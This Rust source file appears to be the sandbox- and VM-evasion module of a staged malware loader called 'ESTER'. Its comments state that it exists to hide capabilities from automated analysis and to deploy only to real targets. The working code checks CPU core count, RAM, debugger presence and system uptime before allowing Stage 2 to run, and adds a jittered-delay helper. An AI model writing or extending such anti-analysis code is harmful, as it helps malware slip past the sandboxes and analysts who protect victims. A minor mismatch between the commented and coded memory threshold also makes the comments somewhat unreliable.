//! Environment validation and evasion checks for Stage 1 (ESTER)
//!
//! **Purpose**: Detect sandbox/VM environments before proceeding to Stage 2
//!
//! **Why these checks exist**:
//! - Avoid wasting the full agent on sandbox analysis
//! - Preserve OPSEC by not revealing capabilities in automated analysis
//! - Only deploy to real targets
//!
//! **Note**: These checks are adapted from the existing agent evasion module

use std::time::SystemTime;

#[cfg(target_os = "windows")]
use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};
#[cfg(target_os = "windows")]
use winapi::um::debugapi::IsDebuggerPresent;

/// Validates that the execution environment is suitable for staging
///
/// Returns `true` if environment appears legitimate, `false` if sandbox/VM detected
///
/// **Checks performed**:
/// - CPU core count (sandboxes often have < 2 cores)
/// - Physical memory (sandboxes often have < 4GB RAM)
/// - Debugger presence
/// - System uptime (sandboxes often have very low uptime)
pub fn validate_environment() -> bool {
    // In dev mode, always pass to allow testing
    #[cfg(feature = "dev")]
    {
        crate::debug_print!("[EVASION] Dev mode - skipping checks");
        return true;
    }

    #[cfg(all(target_os = "windows", feature = "production"))]
    {
        // Check 1: CPU cores
        if !check_cpu_cores() {
            return false;
        }

        // Check 2: Physical memory
        if !check_physical_memory() {
            return false;
        }

        // Check 3: Debugger
        if is_debugger_attached() {
            return false;
        }

        // Check 4: System uptime
        if !check_system_uptime() {
            return false;
        }

        return true;
    }

    #[cfg(not(all(target_os = "windows", feature = "production")))]
    {
        // Non-Windows platforms or dev mode: pass by default
        return true;
    }
}

/// Checks if the system has sufficient CPU cores
/// Sandboxes typically have 1 core, real systems have 2+
#[cfg(target_os = "windows")]
fn check_cpu_cores() -> bool {
    unsafe {
        let mut system_info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut system_info);
        
        let cores = system_info.dwNumberOfProcessors;
        crate::debug_print!("[EVASION] CPU cores: {}", cores);
        
        // Require at least 2 cores
        cores >= 2
    }
}

/// Checks if the system has sufficient physical memory
/// Sandboxes typically have < 4GB, real systems have 4GB+
#[cfg(target_os = "windows")]
fn check_physical_memory() -> bool {
    use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
    
    unsafe {
        let mut mem_status: MEMORYSTATUSEX = std::mem::zeroed();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        
        if GlobalMemoryStatusEx(&mut mem_status) != 0 {
            let total_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
            crate::debug_print!("[EVASION] Physical RAM: {} GB", total_gb);
            
            // Require at least 2GB
            return total_gb >= 2;
        }
    }
    
    // If we can't check, assume it's okay
    true
}

/// Checks if a debugger is attached
#[cfg(target_os = "windows")]
fn is_debugger_attached() -> bool {
    unsafe {
        let result = IsDebuggerPresent() != 0;
        crate::debug_print!("[EVASION] Debugger present: {}", result);
        result
    }
}

/// Checks system uptime to detect fresh VM snapshots
/// Sandboxes often have very low uptime (< 10 minutes)
#[cfg(target_os = "windows")]
fn check_system_uptime() -> bool {
    use winapi::um::sysinfoapi::GetTickCount64;
    
    unsafe {
        let uptime_ms = GetTickCount64();
        let uptime_minutes = uptime_ms / (1000 * 60);
        crate::debug_print!("[EVASION] System uptime: {} minutes", uptime_minutes);
        
        // Require at least 3 minutes uptime
        uptime_minutes >= 3
    }
}

/// Generates a random delay in milliseconds
///
/// Used to simulate human-like behavior and avoid predictable timing patterns
///
/// # Arguments
///
/// * `min_ms` - Minimum delay in milliseconds
/// * `max_ms` - Maximum delay in milliseconds
///
/// # Returns
///
/// Random delay value between min_ms and max_ms
pub fn get_random_delay(min_ms: u64, max_ms: u64) -> u64 {
    // Use SystemTime for pseudo-random without rand dependency in simple cases
    let now = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_millis();
    
    let range = max_ms - min_ms;
    let random = (now % range as u128) as u64;
    
    min_ms + random
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_random_delay() {
        let delay = get_random_delay(1000, 3000);
        assert!(delay >= 1000 && delay <= 3000);
    }

    #[test]
    fn test_validate_environment_dev() {
        // In dev mode, should always return true
        #[cfg(feature = "dev")]
        {
            assert!(validate_environment());
        }
    }
}
